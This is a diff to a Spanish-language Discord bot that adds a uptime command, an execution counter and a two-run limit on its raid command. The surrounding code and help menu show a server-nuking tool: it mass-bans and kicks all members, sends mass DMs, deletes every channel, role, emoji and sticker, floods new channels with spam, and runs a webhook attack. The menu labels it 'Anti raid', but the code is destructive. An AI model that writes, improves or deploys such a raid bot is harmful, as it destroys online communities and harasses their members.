@@ -4,6 +4,7 @@ import asyncio
 import logging
 import os
 import random
+from datetime import datetime  # Necesario para calcular el uptime
 
 # Configuración de logging optimizada para monitoreo
 logging.basicConfig(
@@ -15,8 +16,13 @@ logging.basicConfig(
 PREFIX = "!"
 TOKEN = os.getenv("DISCORD_TOKEN") or "TU_TOKEN_AQUI"
 
-# El banner animado de Discord que mandaste configurado de forma global
+# El banner animado de Discord configurado de forma global
 GIF_URL = "https://cdn.discordapp.com/banners/1334323253992361986/a_1da916f82737a9ca0084c939821aaba7.webp?size=2048&animated=true"
+
+# Configuración de variables globales para el contador y tiempo de inicio
+ejecuciones_actuales = 0
+MAX_EJECUCIONES = 2
+tiempo_inicio = datetime.now()  # Guarda el momento exacto en que inicia el script
 
 # Configuración explícita de los Intents necesarios
 intents = discord.Intents.default()
@@ -28,7 +34,25 @@ bot = commands.Bot(command_prefix=PREFIX, intents=intents)
 
 @bot.event
 async def on_ready():
+    global tiempo_inicio
+    tiempo_inicio = datetime.now()  # Reinicia el tiempo al conectar con Discord
     logging.info(f"⚡ MacHUB Engine Conectado: {bot.user.name} (ID: {bot.user.id})")
+
+
+# ================= NUEVO: COMANDO EJE =================
+@bot.command()
+async def eje(ctx):
+    global ejecuciones_actuales
+    menu = (
+        "============================================\n"
+        f"!eje          -> Muestra el estado de ejecuciones del bot ({ejecuciones_actuales}/{MAX_EJECUCIONES}).\n"
+        "============================================\n"
+    )
+    try:
+        await ctx.send(f"```\n{menu}```")
+    except:
+        pass
+
 
 # ================= 1. COMANDO BANPRO =================
 @bot.command()
@@ -59,11 +83,20 @@ async def banpro(ctx):
         await asyncio.gather(*tasks)
         await asyncio.sleep(0.8)
 
+
 # ================= 2. COMANDO RAIDEAR Y SPAM (rD) =================
 @bot.command()
 async def rD(ctx):
+    global ejecuciones_actuales
+    
     if not ctx.author.guild_permissions.manage_channels: return
     if not ctx.guild.me.guild_permissions.manage_channels: return
+
+    # Control del límite de ejecuciones
+    if ejecuciones_actuales >= MAX_EJECUCIONES:
+        try: await ctx.send(f"❌ Límite alcanzado ({ejecuciones_actuales}/{MAX_EJECUCIONES}). No se pueden realizar más ejecuciones.")
+        except: pass
+        return
 
     channels_to_delete = list(ctx.guild.channels)
     for channel in channels_to_delete:
@@ -91,6 +124,10 @@ async def rD(ctx):
 
     tasks = [spam_task(ch) for ch in created_channels]
     await asyncio.gather(*tasks)
+
+    # Sumamos una ejecución tras finalizar el raid
+    ejecuciones_actuales += 1
+
 
 # ================= 3. EXPULSIÓN MASIVA =================
 @bot.command()
@@ -120,6 +157,7 @@ async def kickpro(ctx):
         await asyncio.gather(*tasks)
         await asyncio.sleep(0.8)
 
+
 # ================= 4. CAMBIAR IDENTIDAD DEL SERVIDOR =================
 @bot.command()
 async def rnServers(ctx):
@@ -131,6 +169,7 @@ async def rnServers(ctx):
         await ctx.send(GIF_URL)
     except:
         pass
+
 
 # ================= 5. BORRAR TODOS LOS ROLES =================
 @bot.command()
@@ -150,6 +189,7 @@ async def rolesD(ctx):
         try: await role.delete(reason="Remoción de roles.")
         except: pass
         await asyncio.sleep(0.2)
+
 
 # ================= 6. CREACIÓN MASIVA DE ROLES =================
 @bot.command()
@@ -172,6 +212,7 @@ async def rolesC(ctx):
         await asyncio.gather(*tasks)
         await asyncio.sleep(0.5)
 
+
 # ================= 7. SATURACIÓN DE CATEGORÍAS =================
 @bot.command()
 async def ccpro(ctx):
@@ -190,6 +231,7 @@ async def ccpro(ctx):
         tasks = [create_category_task() for _ in range(10)]
         await asyncio.gather(*tasks)
         await asyncio.sleep(0.4)
+
 
 # ================= 8. CAMBIAR APODOS GLOBALMENTE =================
 @bot.command()
@@ -217,6 +259,7 @@ async def nickpro(ctx):
         await asyncio.gather(*tasks)
         await asyncio.sleep(0.5)
 
+
 # ================= 9. BORRAR EMOJIS Y STICKERS =================
 @bot.command()
 async def emojisD(ctx):
@@ -233,6 +276,7 @@ async def emojisD(ctx):
     for sticker in list(ctx.guild.stickers):
         try: await sticker.delete()
         except: pass
+
 
 # ================= 10. MULTI-WEBHOOK ATTACK =================
 @bot.command()
@@ -255,19 +299,35 @@ async def hookpro(ctx):
     tasks = [launch_webhook(ch) for ch in channels[:15]]
     await asyncio.gather(*tasks)
 
-# ================= 11. TEST DE LATENCIA (Sin GIF) =================
-@bot.command()
-async def ping(ctx):
-    try: await ctx.send(f"📊 Latencia de Respuesta: `{round(bot.latency * 1000)}ms` | Motor listo.")
-    except: pass
 
-# ================= 12. MENÚ DE AYUDA COMPLETO (Sin GIF) =================
+# ================= 11. NUEVO: COMANDO UPTIME (Reemplaza a ping) =================
+@bot.command()
+async def uptime(ctx):
+    try:
+        delta_tiempo = datetime.now() - tiempo_inicio
+        dias = delta_tiempo.days
+        horas, rem = divmod(delta_tiempo.seconds, 3600)
+        minutos, segundos = divmod(rem, 60)
+        
+        ping_ms = round(bot.latency * 1000)
+        
+        await ctx.send(
+            f"📊 **Estado del bot:**\n"
+            f"⏱️ **Tiempo activo:** `{dias}d {horas}h {minutos}m {segundos}s`\n"
+            f"⚡ **Latencia (Ping):** `{ping_ms}ms`"
+        )
+    except:
+        pass
+
+
+# ================= 12. MENÚ DE AYUDA COMPLETO =================
 @bot.command()
 async def ayuda(ctx):
     menu = (
         "```\n"
         "=== Mc R Anti raid - cmds ===\n"
-        "!ping         -> Muestra la velocidad de respuesta actual.\n"
+        "!uptime       -> Muestra el tiempo activo del bot y la latencia.\n"
+        "!eje          -> Muestra el estado de ejecuciones del bot (0/2, 1/2, 2/2).\n"
         "!banpro       -> DM Masivo + Ban global a todos los miembros.\n"
         "!kickpro      -> Expulsa de inmediato a todos los miembros.\n"
         "!rD           -> elimina todo, crear 50 canales e inundar con 20k mensajes.\n"
@@ -278,11 +338,13 @@ async def ayuda(ctx):
         "!rolesD       -> Destruye todos los roles existentes del servidor.\n"
         "!rolesC       -> Genera 50 roles con colores arcoíris aleatorios.\n"
         "!emojisD      -> elimina los emojis y stickers personalizados.\n"
-        "
-    await ctx.send(embed=embed)
+        "```"
     )
-    try: await ctx.send(menu)
-    except: pass
+    try: 
+        await ctx.send(menu)
+    except: 
+        pass
+
 
 @bot.event
 async def on_command_error(ctx, error):
